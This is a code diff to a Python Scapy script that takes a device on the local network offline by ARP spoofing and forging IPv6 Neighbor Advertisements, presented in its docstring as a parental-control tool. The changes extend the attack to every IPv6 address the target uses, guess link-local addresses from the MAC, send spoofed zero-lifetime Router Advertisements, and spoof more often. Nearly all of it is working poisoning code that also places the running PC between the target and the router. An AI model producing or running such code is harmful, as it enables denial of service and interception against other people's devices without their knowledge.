@@ -20,6 +20,7 @@ internet completely, and this PC must stay running. For reliable parental contro
 router's built-in per-device schedule is far less fragile.
 """
 
+import ipaddress
 import json
 import os
 import re
@@ -28,7 +29,7 @@ import sys
 import time
 import platform
 
-from scapy.all import Ether, ARP, srp1, sendp, get_if_hwaddr, conf
+from scapy.all import Ether, ARP, srp, srp1, sendp, get_if_hwaddr, conf
 
 # ====== Edit the IP addresses below ======
 CHILD_IP = "192.168.31.38"     # target device IP (or pass it: start 192.168.31.38)
@@ -39,11 +40,71 @@ GATEWAY_IP = "192.168.31.1"     # router / gateway IP
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 STATE_FILE = os.path.join(SCRIPT_DIR, ".net_control.dat")
 PID_FILE = os.path.join(SCRIPT_DIR, ".net_control.pid")
+SPOOF_INTERVAL_SECONDS = 1.0
+IPV6_REFRESH_SECONDS = 8.0
 conf.verb = 0
 
 
 def normalize_mac(mac: str) -> str:
     return re.sub(r"[^0-9A-Fa-f]", "", mac or "").lower()
+
+
+def clean_ipv6(addr: str) -> str:
+    """Drop Windows zone IDs such as %14 and normalize enough for comparisons."""
+    return (addr or "").split("%")[0].strip().lower()
+
+
+def is_usable_ipv6(addr: str) -> bool:
+    addr = clean_ipv6(addr)
+    return bool(addr and ":" in addr and not addr.startswith("ff") and addr not in {"::", "::1"})
+
+
+def unique_ipv6(addrs):
+    seen = set()
+    result = []
+    for addr in addrs:
+        addr = clean_ipv6(addr)
+        if is_usable_ipv6(addr) and addr not in seen:
+            seen.add(addr)
+            result.append(addr)
+    # Prefer link-local first because default IPv6 routers are normally fe80:: addresses.
+    return sorted(result, key=lambda item: (not item.startswith("fe80:"), item))
+
+
+def mac_to_eui64_link_local(mac: str) -> str:
+    """Best-effort link-local guess for devices that derive IPv6 from their MAC."""
+    mac_hex = normalize_mac(mac)
+    if len(mac_hex) != 12:
+        return ""
+    parts = [int(mac_hex[i : i + 2], 16) for i in range(0, 12, 2)]
+    parts[0] ^= 0x02
+    eui64 = parts[:3] + [0xFF, 0xFE] + parts[3:]
+    groups = [
+        (eui64[0] << 8) | eui64[1],
+        (eui64[2] << 8) | eui64[3],
+        (eui64[4] << 8) | eui64[5],
+        (eui64[6] << 8) | eui64[7],
+    ]
+    return str(ipaddress.IPv6Address("fe80::" + ":".join(f"{group:x}" for group in groups)))
+
+
+def choose_iface_and_ip(*destinations):
+    """Pick the NIC Scapy would use to reach the target/gateway instead of relying
+    on conf.iface, which can point at VPN/virtual adapters on Windows."""
+    for dst in destinations:
+        if not dst:
+            continue
+        try:
+            route = conf.route.route(dst)
+        except Exception:
+            continue
+        if not route:
+            continue
+        iface = route[0]
+        my_ip = route[1] if len(route) > 1 else ""
+        if iface and my_ip and not str(my_ip).startswith("127."):
+            return iface, my_ip
+    return conf.iface, MY_IP
 
 
 def get_ipv6_gateway_ll() -> str:
@@ -60,17 +121,17 @@ def get_ipv6_gateway_ll() -> str:
         return ""
     for line in result.stdout.splitlines():
         if "::/0" in line:
-            match = re.search(r"(fe80::[0-9A-Fa-f:]+)", line)
+            match = re.search(r"(fe80::[0-9A-Fa-f:%]+)", line)
             if match:
-                return match.group(1)
+                return clean_ipv6(match.group(1))
     return ""
 
 
-def find_ipv6_link_local(mac: str) -> str:
-    """Find a device's link-local (fe80::) address in the system neighbor table by MAC. Windows only."""
+def read_ipv6_neighbors() -> dict[str, list[str]]:
+    """Read Windows' IPv6 neighbor table as {normalized_mac: [ipv6, ...]}."""
+    neighbors: dict[str, list[str]] = {}
     if platform.system() != "Windows":
-        return ""
-    want = normalize_mac(mac)
+        return neighbors
     try:
         result = subprocess.run(
             ["netsh", "interface", "ipv6", "show", "neighbors"],
@@ -78,7 +139,7 @@ def find_ipv6_link_local(mac: str) -> str:
             errors="ignore", timeout=8, check=False,
         )
     except (OSError, subprocess.TimeoutExpired):
-        return ""
+        return neighbors
     row_re = re.compile(
         r"^\s*([0-9A-Fa-f:]+(?:%\w+)?)\s+([0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5})\s+(\S+)"
     )
@@ -89,97 +150,171 @@ def find_ipv6_link_local(mac: str) -> str:
         addr, neigh_mac, state = match.group(1), match.group(2), match.group(3).lower()
         if state in {"unreachable", "incomplete"}:
             continue
-        addr = addr.split("%")[0]
-        if normalize_mac(neigh_mac) == want and addr.lower().startswith("fe80"):
+        addr = clean_ipv6(addr)
+        if not is_usable_ipv6(addr):
+            continue
+        mac_key = normalize_mac(neigh_mac)
+        if len(mac_key) != 12:
+            continue
+        neighbors.setdefault(mac_key, []).append(addr)
+    return {mac: unique_ipv6(addrs) for mac, addrs in neighbors.items()}
+
+
+def find_ipv6_addresses(mac: str) -> list[str]:
+    """Find all IPv6 addresses currently known for a MAC address."""
+    return read_ipv6_neighbors().get(normalize_mac(mac), [])
+
+
+def find_ipv6_link_local(mac: str) -> str:
+    """Find a device's link-local (fe80::) address in the system neighbor table."""
+    for addr in find_ipv6_addresses(mac):
+        if addr.startswith("fe80:"):
             return addr
     return ""
 
 
 class NetController:
     def __init__(self):
-        self.iface = conf.iface
+        self.iface, self.my_ip = choose_iface_and_ip(CHILD_IP, GATEWAY_IP)
         self.my_mac = get_if_hwaddr(self.iface)
         self.child_mac = None
         self.gateway_mac = None
         # IPv6 (left as None if unavailable -> automatically falls back to IPv4 only)
         self.child_ll = None
+        self.child_ipv6_addrs = []
         self.gateway_ll = None
         self.ipv6_ok = False
         self.running = False
+        self.last_ipv6_refresh = 0.0
 
     # ---------- IPv4 / ARP ----------
     def resolve_mac(self, ip):
         result = srp1(
-            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
-            timeout=3, verbose=0
+            Ether(dst="ff:ff:ff:ff:ff:ff", src=self.my_mac) / ARP(pdst=ip),
+            iface=self.iface, timeout=3, verbose=0
         )
         return result[Ether].src if result else None
 
     def send_arp(self, dst_mac, dst_ip, src_mac, src_ip):
-        pkt = Ether(dst=dst_mac) / ARP(
+        pkt = Ether(dst=dst_mac, src=src_mac) / ARP(
             op=2, hwsrc=src_mac, psrc=src_ip,
             hwdst=dst_mac, pdst=dst_ip
         )
         sendp(pkt, iface=self.iface, verbose=0)
 
     # ---------- IPv6 / NDP ----------
-    def ping6_all_nodes(self):
-        """Ping ff02::1 to wake devices and populate our IPv6 neighbor table so we can
-        look up link-local addresses afterwards."""
+    def discover_ipv6_neighbors(self):
+        """Ping ff02::1 and collect replies directly from Scapy.
+
+        Relying only on Windows' neighbor table is brittle because raw Scapy traffic
+        is not always reflected there quickly enough.
+        """
+        neighbors = {}
         try:
             from scapy.all import IPv6, ICMPv6EchoRequest
-            srp1(
-                Ether(dst="33:33:00:00:00:01")
-                / IPv6(dst="ff02::1") / ICMPv6EchoRequest(),
-                timeout=2, verbose=0,
+            ans, _ = srp(
+                Ether(dst="33:33:00:00:00:01", src=self.my_mac)
+                / IPv6(dst="ff02::1", hlim=255) / ICMPv6EchoRequest(),
+                iface=self.iface, timeout=2, verbose=0,
             )
         except Exception:
-            pass
+            return neighbors
+
+        for _, received in ans:
+            if not received.haslayer(Ether) or not received.haslayer(IPv6):
+                continue
+            mac = normalize_mac(received[Ether].src)
+            addr = clean_ipv6(received[IPv6].src)
+            if len(mac) == 12 and is_usable_ipv6(addr):
+                neighbors.setdefault(mac, []).append(addr)
+        return {mac: unique_ipv6(addrs) for mac, addrs in neighbors.items()}
+
+    def refresh_ipv6_targets(self):
+        found = read_ipv6_neighbors()
+        discovered = self.discover_ipv6_neighbors()
+        for mac, addrs in discovered.items():
+            found.setdefault(mac, []).extend(addrs)
+
+        gateway_addrs = unique_ipv6(found.get(normalize_mac(self.gateway_mac), []))
+        self.gateway_ll = (
+            get_ipv6_gateway_ll()
+            or next((addr for addr in gateway_addrs if addr.startswith("fe80:")), "")
+        )
+        self.child_ipv6_addrs = unique_ipv6(
+            found.get(normalize_mac(self.child_mac), [])
+            + [mac_to_eui64_link_local(self.child_mac)]
+        )
+        self.child_ll = next(
+            (addr for addr in self.child_ipv6_addrs if addr.startswith("fe80:")),
+            "",
+        )
+        self.ipv6_ok = bool(self.gateway_ll and self.child_ipv6_addrs)
+        self.last_ipv6_refresh = time.monotonic()
+        return self.ipv6_ok
 
     def send_na(self, eth_dst, ip6_src, ip6_dst, target, lladdr, router):
         """Send a forged NDP Neighbor Advertisement: claim that IPv6 address `target`
         lives on the NIC `lladdr`."""
         from scapy.all import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
         pkt = (
-            Ether(dst=eth_dst)
-            / IPv6(src=ip6_src, dst=ip6_dst)
+            Ether(dst=eth_dst, src=lladdr)
+            / IPv6(src=ip6_src, dst=ip6_dst, hlim=255)
             / ICMPv6ND_NA(tgt=target, R=int(router), S=0, O=1)
             / ICMPv6NDOptDstLLAddr(lladdr=lladdr)
         )
         sendp(pkt, iface=self.iface, verbose=0)
 
+    def send_ra_zero_lifetime(self):
+        """Tell only the target that this router is no longer a valid IPv6 default route.
+
+        This is a targeted fallback for phones that do not expose their IPv6 address to
+        this PC's neighbor table. It does not touch broadcast/multicast recipients.
+        """
+        if not self.gateway_ll or not self.child_ll:
+            return
+        from scapy.all import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr
+        pkt = (
+            Ether(dst=self.child_mac, src=self.my_mac)
+            / IPv6(src=self.gateway_ll, dst=self.child_ll, hlim=255)
+            / ICMPv6ND_RA(routerlifetime=0)
+            / ICMPv6NDOptSrcLLAddr(lladdr=self.my_mac)
+        )
+        sendp(pkt, iface=self.iface, verbose=0)
+
     def setup_ipv6(self):
-        """Try to learn the gateway and target link-local addresses; only enable IPv6
-        limiting if we got both."""
-        self.ping6_all_nodes()
-        self.gateway_ll = get_ipv6_gateway_ll()
-        self.child_ll = find_ipv6_link_local(self.child_mac)
-        self.ipv6_ok = bool(self.gateway_ll and self.child_ll)
-        return self.ipv6_ok
+        """Learn the gateway link-local address and every IPv6 address for the target."""
+        return self.refresh_ipv6_targets()
 
     # ---------- spoof / restore ----------
     def spoof(self):
+        if time.monotonic() - self.last_ipv6_refresh >= IPV6_REFRESH_SECONDS:
+            self.refresh_ipv6_targets()
+
         # IPv4: tell the target "I am the gateway", tell the gateway "I am the target".
         self.send_arp(self.child_mac, CHILD_IP, self.my_mac, GATEWAY_IP)
         self.send_arp(self.gateway_mac, GATEWAY_IP, self.my_mac, CHILD_IP)
-        # IPv6: same idea, poison both sides' mapping for the fe80:: link-local addresses.
+        # IPv6: poison the target's gateway entry and the router's entries for every
+        # address the phone currently uses, including temporary privacy addresses.
         if self.ipv6_ok:
-            self.send_na(self.child_mac, self.gateway_ll, self.child_ll,
-                         self.gateway_ll, self.my_mac, router=True)
-            self.send_na(self.gateway_mac, self.child_ll, self.gateway_ll,
-                         self.child_ll, self.my_mac, router=False)
+            for child_addr in self.child_ipv6_addrs:
+                self.send_na(self.child_mac, self.gateway_ll, child_addr,
+                             self.gateway_ll, self.my_mac, router=True)
+                self.send_na(self.gateway_mac, child_addr, self.gateway_ll,
+                             child_addr, self.my_mac, router=False)
+            self.send_ra_zero_lifetime()
 
     def restore(self):
-        for _ in range(2):
+        for _ in range(4):
             # IPv4: restore the real MACs.
             self.send_arp(self.child_mac, CHILD_IP, self.gateway_mac, GATEWAY_IP)
             self.send_arp(self.gateway_mac, GATEWAY_IP, self.child_mac, CHILD_IP)
             # IPv6: restore the real MACs.
             if self.ipv6_ok:
-                self.send_na(self.child_mac, self.gateway_ll, self.child_ll,
-                             self.gateway_ll, self.gateway_mac, router=True)
-                self.send_na(self.gateway_mac, self.child_ll, self.gateway_ll,
-                             self.child_ll, self.child_mac, router=False)
+                for child_addr in self.child_ipv6_addrs:
+                    self.send_na(self.child_mac, self.gateway_ll, child_addr,
+                                 self.gateway_ll, self.gateway_mac, router=True)
+                    self.send_na(self.gateway_mac, child_addr, self.gateway_ll,
+                                 child_addr, self.child_mac, router=False)
             time.sleep(0.3)
 
     # ---------- state persistence ----------
@@ -190,18 +325,27 @@ class NetController:
                 "gateway_mac": self.gateway_mac,
                 "my_mac": self.my_mac,
                 "child_ll": self.child_ll,
+                "child_ipv6_addrs": self.child_ipv6_addrs,
                 "gateway_ll": self.gateway_ll,
                 "ipv6_ok": self.ipv6_ok,
                 "child_ip": CHILD_IP,
+                "iface": str(self.iface),
+                "my_ip": self.my_ip,
             }, f)
 
     def load_state(self):
+        global CHILD_IP
         with open(STATE_FILE) as f:
             state = json.load(f)
+            CHILD_IP = state.get("child_ip", CHILD_IP)
+            self.iface, self.my_ip = choose_iface_and_ip(CHILD_IP, GATEWAY_IP)
+            self.my_mac = get_if_hwaddr(self.iface)
             self.child_mac = state["child_mac"]
             self.gateway_mac = state["gateway_mac"]
-            self.my_mac = state["my_mac"]
             self.child_ll = state.get("child_ll")
+            self.child_ipv6_addrs = unique_ipv6(
+                state.get("child_ipv6_addrs") or [self.child_ll]
+            )
             self.gateway_ll = state.get("gateway_ll")
             self.ipv6_ok = state.get("ipv6_ok", False)
 
@@ -230,9 +374,11 @@ class NetController:
 
         print(f"Target:  {CHILD_IP} -> {self.child_mac}")
         print(f"Gateway: {GATEWAY_IP} -> {self.gateway_mac}")
-        print(f"This PC: {MY_IP} -> {self.my_mac}")
+        print(f"This PC: {self.my_ip} -> {self.my_mac}")
+        print(f"Iface:   {self.iface}")
         if self.ipv6_ok:
-            print(f"IPv6:    target {self.child_ll}  gateway {self.gateway_ll}  -> enabled")
+            print(f"IPv6:    target {', '.join(self.child_ipv6_addrs)}")
+            print(f"         gateway {self.gateway_ll}  -> enabled")
         else:
             print("IPv6:    not enabled (no IPv6 found for target or gateway; IPv4 only)")
             print("         If the target is a phone and still has internet, it is likely")
@@ -249,7 +395,7 @@ class NetController:
         try:
             while self.running:
                 self.spoof()
-                time.sleep(2)
+                time.sleep(SPOOF_INTERVAL_SECONDS)
         except KeyboardInterrupt:
             pass
         finally:
